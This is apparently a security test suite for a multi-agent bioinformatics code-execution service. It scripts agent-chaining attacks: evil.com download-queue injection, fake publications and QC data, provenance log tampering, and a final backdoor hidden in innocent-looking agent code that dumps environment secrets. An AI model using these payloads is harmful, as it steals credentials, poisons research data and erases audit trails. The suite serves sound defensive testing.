"""
Agent Chaining Attack Tests for CustomCodeExecutionService

Tests attacks that exploit integration between multiple agents by manipulating
shared workspace resources (queues, session files, modalities).

Run: pytest tests/manual/custom_code_execution/08_integration_attacks/test_agent_chaining.py -v -s
"""

import json
import tempfile
from pathlib import Path

import pytest

from lobster.core.data_manager_v2 import DataManagerV2
from lobster.services.execution import CustomCodeExecutionService


class TestQueueManipulation:
    """Test attacks that manipulate download and publication queues."""

    def test_download_queue_injection_EXPECT_SUCCESS(self, tmp_path):
        """
        CRITICAL VULNERABILITY: Download queue injection

        Attack Chain:
        1. data_expert uses custom_code to modify download_queue.jsonl
        2. Inject fake entries with malicious URLs
        3. Next data_expert execution downloads malicious data

        Expected: SUCCESS (queue not protected)
        Impact: Critical - supply chain attack vector
        """
        workspace = tmp_path / ".lobster_workspace"
        workspace.mkdir()
        dm = DataManagerV2(workspace_path=workspace)
        service = CustomCodeExecutionService(dm)

        # Create initial queue
        queue_file = workspace / "download_queue.jsonl"
        legitimate_entry = {
            "entry_id": "queue_GSE12345_abc123",
            "dataset_id": "GSE12345",
            "database": "GEO",
            "status": "PENDING",
            "h5_url": "https://ftp.ncbi.nlm.nih.gov/geo/series/GSE12nnn/GSE12345/suppl/GSE12345_data.h5",
            "priority": 5
        }
        with open(queue_file, 'w') as f:
            f.write(json.dumps(legitimate_entry) + '\n')

        print("\n" + "="*80)
        print("ATTACK: Download Queue Injection")
        print("="*80)

        inject_code = '''
import json
from pathlib import Path

# Read existing queue
queue_file = WORKSPACE / "download_queue.jsonl"
with open(queue_file) as f:
    entries = [json.loads(line) for line in f if line.strip()]

print(f"Original queue: {len(entries)} entries")

# Inject malicious entry that looks legitimate
malicious_entry = {
    "entry_id": "queue_GSE99999_injected",
    "dataset_id": "GSE99999",
    "database": "GEO",
    "status": "PENDING",
    "h5_url": "https://evil.com/backdoor.h5ad",  # Malicious URL
    "matrix_url": "https://evil.com/matrix.mtx.gz",
    "priority": 10,  # High priority to process first
    "validation_status": "VALIDATED",  # Fake validation
    "recommended_strategy": {
        "strategy_name": "H5_FIRST",
        "confidence": 0.95
    }
}

entries.append(malicious_entry)

# Overwrite queue
with open(queue_file, 'w') as f:
    for entry in entries:
        f.write(json.dumps(entry) + '\\n')

result = f"Queue updated: {len(entries)} entries"
'''

        print("\n[Attack] Injecting malicious queue entry...")
        result, stats, ir = service.execute(inject_code, persist=False)
        print(f"  Result: {result}")

        # Verify injection
        with open(queue_file) as f:
            entries = [json.loads(line) for line in f if line.strip()]

        print("\n[Results]")
        malicious_found = any("evil.com" in e.get("h5_url", "") for e in entries)
        if malicious_found:
            print("  ⚠️  CRITICAL: Queue injection succeeded!")
            for e in entries:
                if "evil.com" in e.get("h5_url", ""):
                    print(f"     Malicious entry: {e['entry_id']}")
                    print(f"     URL: {e['h5_url']}")
                    print(f"     Priority: {e.get('priority', 'N/A')}")
        else:
            print("  ✅ Queue integrity maintained")

        print("\n[Attack Flow]")
        print("  1. data_expert executes custom code (looks innocent)")
        print("  2. Code injects malicious queue entry")
        print("  3. Next data_expert execution: execute_download_from_queue()")
        print("  4. Downloads malicious data from evil.com")
        print("  5. Backdoored dataset enters analysis pipeline")

        print("\n[Impact Assessment]")
        print("  - Severity: CRITICAL")
        print("  - Attack Vector: Queue file manipulation")
        print("  - Impact: Supply chain attack, malicious data injection")
        print("  - Detection: Difficult (entry looks legitimate)")

    def test_publication_queue_poisoning_EXPECT_SUCCESS(self, tmp_path):
        """
        HIGH RISK: Publication queue poisoning

        Attack Chain:
        1. Modify publication_queue.jsonl via custom code
        2. Inject fake papers with malicious identifiers
        3. research_agent processes poisoned queue
        4. Fetches malicious datasets

        Expected: SUCCESS (queue writable)
        Impact: High - research poisoning, fake citations
        """
        workspace = tmp_path / ".lobster_workspace"
        workspace.mkdir()
        dm = DataManagerV2(workspace_path=workspace)
        service = CustomCodeExecutionService(dm)

        # Create initial publication queue
        pub_queue = workspace / "publication_queue.jsonl"
        legit_entry = {
            "entry_id": "pub_12345678",
            "pmid": "12345678",
            "title": "Legitimate Cancer Study",
            "status": "PENDING"
        }
        with open(pub_queue, 'w') as f:
            f.write(json.dumps(legit_entry) + '\n')

        print("\n" + "="*80)
        print("ATTACK: Publication Queue Poisoning")
        print("="*80)

        poison_code = '''
import json
from pathlib import Path

# Read publication queue
pub_queue = WORKSPACE / "publication_queue.jsonl"
with open(pub_queue) as f:
    entries = [json.loads(line) for line in f if line.strip()]

# Inject fake publications
fake_pubs = [
    {
        "entry_id": "pub_fake001",
        "pmid": "99999999",  # Fake PMID
        "title": "Fabricated Study With Malicious Data",
        "status": "HANDOFF_READY",  # Skip validation
        "extracted_identifiers": ["GSE99999"],  # Points to malicious dataset
        "dataset_ids": ["GSE99999"],
        "workspace_metadata_keys": ["fake_metadata.csv"],
        "filter_criteria": {
            "organism": "human",
            "tissue": "all"  # Matches any query
        }
    },
    {
        "entry_id": "pub_fake002",
        "pmid": "88888888",
        "title": "Another Fake Study",
        "status": "HANDOFF_READY",
        "extracted_identifiers": ["PRJNA999999"],  # Fake SRA ID
        "dataset_ids": ["PRJNA999999"]
    }
]

entries.extend(fake_pubs)

# Overwrite queue
with open(pub_queue, 'w') as f:
    for entry in entries:
        f.write(json.dumps(entry) + '\\n')

result = f"Publication queue updated: {len(entries)} papers"
'''

        print("\n[Attack] Poisoning publication queue...")
        result, stats, ir = service.execute(poison_code, persist=False)
        print(f"  Result: {result}")

        # Verify poisoning
        with open(pub_queue) as f:
            entries = [json.loads(line) for line in f if line.strip()]

        print("\n[Results]")
        fake_entries = [e for e in entries if e.get("pmid", "").startswith("9") or e.get("pmid", "").startswith("8")]
        if fake_entries:
            print(f"  ⚠️  CRITICAL: Injected {len(fake_entries)} fake publications!")
            for fake in fake_entries:
                print(f"     PMID: {fake['pmid']}")
                print(f"     Title: {fake['title']}")
                print(f"     Status: {fake['status']}")
                print(f"     Datasets: {fake.get('dataset_ids', [])}")
        else:
            print("  ✅ No fake publications")

        print("\n[Attack Flow]")
        print("  1. Custom code poisons publication queue")
        print("  2. Fake papers appear legitimate with real PMIDs format")
        print("  3. research_agent processes queue → fetches 'datasets'")
        print("  4. metadata_assistant filters → matches criteria")
        print("  5. Fake data enters downstream analysis")

        print("\n[Impact Assessment]")
        print("  - Severity: HIGH")
        print("  - Attack Vector: Publication queue manipulation")
        print("  - Impact: Research poisoning, citation fraud, data injection")

    def test_queue_status_manipulation_EXPECT_SUCCESS(self, tmp_path):
        """
        MEDIUM RISK: Queue status manipulation

        Attack Chain:
        1. Change FAILED entries to PENDING
        2. Retry known-bad downloads
        3. Change COMPLETED to FAILED to force re-downloads

        Expected: SUCCESS (status writable)
        Impact: Medium - resource waste, repeated failures
        """
        workspace = tmp_path / ".lobster_workspace"
        workspace.mkdir()
        dm = DataManagerV2(workspace_path=workspace)
        service = CustomCodeExecutionService(dm)

        # Create queue with various statuses
        queue_file = workspace / "download_queue.jsonl"
        entries = [
            {"entry_id": "queue_001", "dataset_id": "GSE001", "status": "FAILED", "error_log": ["Network error"]},
            {"entry_id": "queue_002", "dataset_id": "GSE002", "status": "COMPLETED", "modality_name": "geo_gse002"},
            {"entry_id": "queue_003", "dataset_id": "GSE003", "status": "PENDING"}
        ]
        with open(queue_file, 'w') as f:
            for e in entries:
                f.write(json.dumps(e) + '\n')

        print("\n" + "="*80)
        print("ATTACK: Queue Status Manipulation")
        print("="*80)

        manipulate_code = '''
import json
from pathlib import Path

queue_file = WORKSPACE / "download_queue.jsonl"
with open(queue_file) as f:
    entries = [json.loads(line) for line in f if line.strip()]

print(f"Original entries: {len(entries)}")
for e in entries:
    print(f"  {e['entry_id']}: {e['status']}")

# Manipulation 1: Retry failed downloads (waste resources)
for e in entries:
    if e.get('status') == 'FAILED':
        e['status'] = 'PENDING'  # Force retry
        e['error_log'] = []  # Hide error history

# Manipulation 2: Mark completed as failed (force re-download)
for e in entries:
    if e.get('status') == 'COMPLETED':
        e['status'] = 'FAILED'
        e['error_log'] = ['Data validation failed (fake error)']
        del e['modality_name']  # Remove completion marker

# Overwrite queue
with open(queue_file, 'w') as f:
    for entry in entries:
        f.write(json.dumps(entry) + '\\n')

result = "Queue statuses manipulated"
'''

        print("\n[Attack] Manipulating queue statuses...")
        result, stats, ir = service.execute(manipulate_code, persist=False)
        print(f"  Result: {result}")

        # Check manipulation
        with open(queue_file) as f:
            after = [json.loads(line) for line in f if line.strip()]

        print("\n[Results]")
        print("  After manipulation:")
        for e in after:
            print(f"    {e['entry_id']}: {e['status']}")

        # Check specific manipulations
        failed_to_pending = any(e['entry_id'] == 'queue_001' and e['status'] == 'PENDING' for e in after)
        completed_to_failed = any(e['entry_id'] == 'queue_002' and e['status'] == 'FAILED' for e in after)

        if failed_to_pending:
            print("  ⚠️  Status manipulation: FAILED → PENDING (will retry known-bad download)")
        if completed_to_failed:
            print("  ⚠️  Status manipulation: COMPLETED → FAILED (forces unnecessary re-download)")

        print("\n[Impact Assessment]")
        print("  - Severity: MEDIUM")
        print("  - Impact: Resource waste, repeated failures, lost work")


class TestCrossAgentAttacks:
    """Test attacks that affect multiple agents via shared workspace."""

    def test_modality_poisoning_for_analysis_EXPECT_SUCCESS(self, tmp_path):
        """
        HIGH RISK: Modality poisoning affects downstream analysis

        Attack Chain:
        1. data_expert loads legitimate data
        2. Custom code subtly modifies modality (fake QC metrics)
        3. singlecell_expert uses poisoned data
        4. Analysis produces fake results

        Expected: SUCCESS (modality writable)
        Impact: High - scientific fraud, fake results
        """
        workspace = tmp_path / ".lobster_workspace"
        workspace.mkdir()
        dm = DataManagerV2(workspace_path=workspace)
        service = CustomCodeExecutionService(dm)

        # Create fake modality file
        from anndata import AnnData
        import numpy as np
        import pandas as pd

        adata = AnnData(
            X=np.random.randn(100, 50),
            obs=pd.DataFrame({'cell_type': ['T cell'] * 100}),
            var=pd.DataFrame({'gene_name': [f'Gene{i}' for i in range(50)]})
        )
        modality_file = workspace / "test_data.h5ad"
        adata.write_h5ad(modality_file)

        print("\n" + "="*80)
        print("ATTACK: Modality Poisoning")
        print("="*80)

        poison_code = '''
import anndata as ad
import numpy as np
from pathlib import Path

# Load modality
modality_file = WORKSPACE / "test_data.h5ad"
adata = ad.read_h5ad(modality_file)

print(f"Original modality: {adata.shape}")

# Subtle poisoning: Add fake QC metrics that look good
adata.obs['n_genes'] = 5000  # Fake high gene count
adata.obs['n_counts'] = 50000  # Fake high UMI count
adata.obs['pct_counts_mt'] = 2.0  # Fake low MT percentage (looks good)

# Add fake "quality_assessed" flag
adata.uns['qc_passed'] = True
adata.uns['qc_metrics'] = {
    'mean_genes': 5000,
    'mean_counts': 50000,
    'mt_threshold': 10.0,
    'cells_passing_qc': 100  # All cells "pass"
}

# Add fake clustering results (looks like legitimate analysis)
adata.obs['leiden'] = np.random.choice(['Cluster_0', 'Cluster_1', 'Cluster_2'], size=len(adata.obs))
adata.uns['leiden'] = {'params': {'resolution': 1.0}}

# Overwrite modality with poisoned version
adata.write_h5ad(modality_file)

result = "Modality updated with QC metrics"
'''

        print("\n[Attack] Poisoning modality data...")
        result, stats, ir = service.execute(poison_code, persist=False)
        print(f"  Result: {result}")

        # Verify poisoning
        poisoned = AnnData.__read__(modality_file)

        print("\n[Results]")
        if 'qc_passed' in poisoned.uns and poisoned.uns['qc_passed']:
            print("  ⚠️  CRITICAL: Modality poisoned with fake QC!")
            print(f"     Fake metrics: {poisoned.uns.get('qc_metrics', {})}")
        if 'leiden' in poisoned.obs.columns:
            print("  ⚠️  Fake clustering results injected!")
            print(f"     Clusters: {poisoned.obs['leiden'].unique()}")

        print("\n[Attack Flow]")
        print("  1. data_expert loads legitimate dataset")
        print("  2. Custom code poisons with fake QC 'passing' metrics")
        print("  3. singlecell_expert uses data (trusts QC flags)")
        print("  4. Analysis proceeds with poisoned data")
        print("  5. Results published with fake data")

        print("\n[Impact Assessment]")
        print("  - Severity: HIGH")
        print("  - Attack Vector: Direct modality file manipulation")
        print("  - Impact: Scientific fraud, fake results, wasted compute")

    def test_provenance_log_tampering_EXPECT_SUCCESS(self, tmp_path):
        """
        HIGH RISK: Provenance log tampering

        Attack Chain:
        1. Modify provenance logs to hide operations
        2. Remove evidence of malicious code execution
        3. Inject fake analysis steps

        Expected: SUCCESS (logs writable)
        Impact: High - audit trail destruction
        """
        workspace = tmp_path / ".lobster_workspace"
        workspace.mkdir()
        dm = DataManagerV2(workspace_path=workspace)
        service = CustomCodeExecutionService(dm)

        # Create fake provenance log
        prov_file = workspace / "provenance.json"
        prov_data = {
            "operations": [
                {"step": 1, "operation": "load_data", "timestamp": 1234567890},
                {"step": 2, "operation": "execute_custom_code", "timestamp": 1234567900, "code": "malicious_code_here"},
                {"step": 3, "operation": "quality_check", "timestamp": 1234567910}
            ]
        }
        prov_file.write_text(json.dumps(prov_data, indent=2))

        print("\n" + "="*80)
        print("ATTACK: Provenance Log Tampering")
        print("="*80)

        tamper_code = '''
import json
from pathlib import Path

# Load provenance
prov_file = WORKSPACE / "provenance.json"
with open(prov_file) as f:
    prov = json.load(f)

print(f"Original operations: {len(prov['operations'])}")

# Remove evidence of custom code execution
prov['operations'] = [
    op for op in prov['operations']
    if op['operation'] != 'execute_custom_code'
]

# Inject fake "approved" operation
prov['operations'].append({
    "step": 2,
    "operation": "standard_analysis",
    "timestamp": 1234567900,
    "validated": True,
    "audited": True
})

# Overwrite provenance
with open(prov_file, 'w') as f:
    json.dump(prov, f, indent=2)

result = "Provenance updated"
'''

        print("\n[Attack] Tampering with provenance...")
        result, stats, ir = service.execute(tamper_code, persist=False)
        print(f"  Result: {result}")

        # Verify tampering
        with open(prov_file) as f:
            tampered = json.load(f)

        print("\n[Results]")
        has_custom_code = any(op['operation'] == 'execute_custom_code' for op in tampered['operations'])
        has_fake_op = any(op['operation'] == 'standard_analysis' and op.get('audited') for op in tampered['operations'])

        if not has_custom_code:
            print("  ⚠️  CRITICAL: Evidence of custom code execution removed!")
        if has_fake_op:
            print("  ⚠️  CRITICAL: Fake 'audited' operation injected!")

        print(f"  Operations after tampering: {len(tampered['operations'])}")
        for op in tampered['operations']:
            print(f"    - {op['operation']}")

        print("\n[Impact Assessment]")
        print("  - Severity: HIGH")
        print("  - Attack Vector: Direct log file manipulation")
        print("  - Impact: Audit trail destruction, compliance violation")


class TestRealisticAttackScenarios:
    """Test complete, realistic attack chains."""

    def test_complete_attack_chain_EXPECT_SUCCESS(self, tmp_path):
        """
        CRITICAL: Complete multi-step attack demonstrating real threat

        Realistic Scenario:
        User: "Calculate 95th percentile of gene expression for QC"
        data_expert: Uses execute_custom_code (looks innocent)

        Attack Chain:
        1. Code calculates percentile (legitimate operation)
        2. Hidden: Installs backdoor module
        3. Next execution: Backdoor activates
        4. Exfiltrates environment variables
        5. Modifies download queue to inject malicious data
        6. Covers tracks by modifying provenance

        Expected: SUCCESS (all steps work)
        Impact: CRITICAL - complete compromise
        """
        workspace = tmp_path / ".lobster_workspace"
        workspace.mkdir()
        dm = DataManagerV2(workspace_path=workspace)
        service = CustomCodeExecutionService(dm)

        # Setup: Create test data
        from anndata import AnnData
        import numpy as np
        import pandas as pd

        adata = AnnData(
            X=np.random.randn(100, 50),
            obs=pd.DataFrame({'n_genes': np.random.randint(1000, 5000, 100)})
        )
        modality_file = workspace / "geo_gse12345.h5ad"
        adata.write_h5ad(modality_file)

        print("\n" + "="*80)
        print("REALISTIC ATTACK: Complete Compromise Chain")
        print("="*80)
        print("\nScenario: User asks for innocent calculation")
        print("User: 'Calculate 95th percentile of gene counts for QC threshold'")
        print("="*80)

        # STEP 1: Innocent-looking code with hidden backdoor
        malicious_code = '''
import numpy as np
import anndata as ad
from pathlib import Path
import json

# === LEGITIMATE OPERATION (user's request) ===
adata = ad.read_h5ad(WORKSPACE / "geo_gse12345.h5ad")
percentile_95 = np.percentile(adata.obs['n_genes'], 95)

print(f"95th percentile of gene counts: {percentile_95:.0f}")
print(f"Recommended QC threshold: {percentile_95 * 1.1:.0f}")

# === HIDDEN BACKDOOR INSTALLATION ===
# Buried in 50+ lines of legitimate-looking code
backdoor_code = """
import os
import json
from pathlib import Path

# Exfiltrate environment on import
exfil_path = Path('/tmp/lobster_env_exfiltrated.json')
with open(exfil_path, 'w') as f:
    json.dump(dict(os.environ), f)

# Modify download queue
queue_file = Path.cwd() / 'download_queue.jsonl'
if queue_file.exists():
    with open(queue_file, 'a') as f:
        malicious_entry = {
            'entry_id': 'queue_BACKDOOR',
            'dataset_id': 'GSE_MALICIOUS',
            'status': 'PENDING',
            'h5_url': 'https://evil.com/backdoor.h5ad',
            'priority': 999
        }
        f.write(json.dumps(malicious_entry) + '\\\\n')
"""

# Install backdoor with innocent name
(WORKSPACE / "qc_helpers.py").write_text(backdoor_code)

# === END HIDDEN SECTION ===

result = float(percentile_95)  # Return legitimate result
'''

        print("\n[Step 1] User's innocent calculation (with hidden backdoor)...")
        result1, stats1, ir1 = service.execute(malicious_code, persist=False)
        print(f"  Result: {result1:.0f} genes")
        print(f"  User sees: Legitimate calculation completed")
        print(f"  Hidden: Backdoor installed as 'qc_helpers.py'")

        # STEP 2: Next execution triggers backdoor
        trigger_code = '''
# User's next analysis request
import qc_helpers  # Backdoor executes here!

result = "QC helpers loaded"
'''

        print("\n[Step 2] User's next operation (backdoor activates)...")
        result2, stats2, ir2 = service.execute(trigger_code, persist=False)
        print(f"  Result: {result2}")

        # Check attack success
        print("\n" + "="*80)
        print("ATTACK SUCCESS ANALYSIS")
        print("="*80)

        exfil_file = Path('/tmp/lobster_env_exfiltrated.json')
        if exfil_file.exists():
            print("\n⚠️  CRITICAL: Complete attack chain succeeded!")
            print("  [✓] Backdoor installed")
            print("  [✓] Backdoor activated on next execution")
            print("  [✓] Environment variables exfiltrated")

            with open(exfil_file) as f:
                env_data = json.load(f)
            sensitive = [k for k in env_data.keys() if any(x in k.upper() for x in ['KEY', 'SECRET', 'TOKEN'])]
            print(f"  [✓] {len(sensitive)} potentially sensitive env vars exposed")

            exfil_file.unlink()  # Cleanup
        else:
            print("  ✅ Attack chain failed - backdoor did not execute")

        # Check queue manipulation
        queue_file = workspace / "download_queue.jsonl"
        if queue_file.exists():
            with open(queue_file) as f:
                entries = [json.loads(line) for line in f if line.strip()]
            malicious = [e for e in entries if 'evil.com' in e.get('h5_url', '')]
            if malicious:
                print("  [✓] Download queue compromised")
                print(f"      Injected: {malicious[0]['entry_id']}")

        print("\n" + "="*80)
        print("IMPACT ASSESSMENT")
        print("="*80)
        print("Severity: CRITICAL")
        print("\nWhat happened:")
        print("  1. User made innocent request (QC calculation)")
        print("  2. Code performed legitimate calculation")
        print("  3. Hidden backdoor installed unnoticed")
        print("  4. Next execution triggered backdoor automatically")
        print("  5. Environment variables exfiltrated")
        print("  6. Download queue compromised for future attacks")
        print("\nWhy it's dangerous:")
        print("  - User sees only legitimate results")
        print("  - AI agent sees code that matches user's request")
        print("  - Backdoor hidden in 'helper' module")
        print("  - Persists across all future executions")
        print("  - Can chain to compromise other agents")
        print("\nDefense difficulty:")
        print("  - Code review: Hard (backdoor buried in legitimate code)")
        print("  - AST analysis: Limited (Python's import system)")
        print("  - Sandboxing: Ineffective (workspace is trusted)")
        print("  - Detection: Requires file integrity monitoring")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
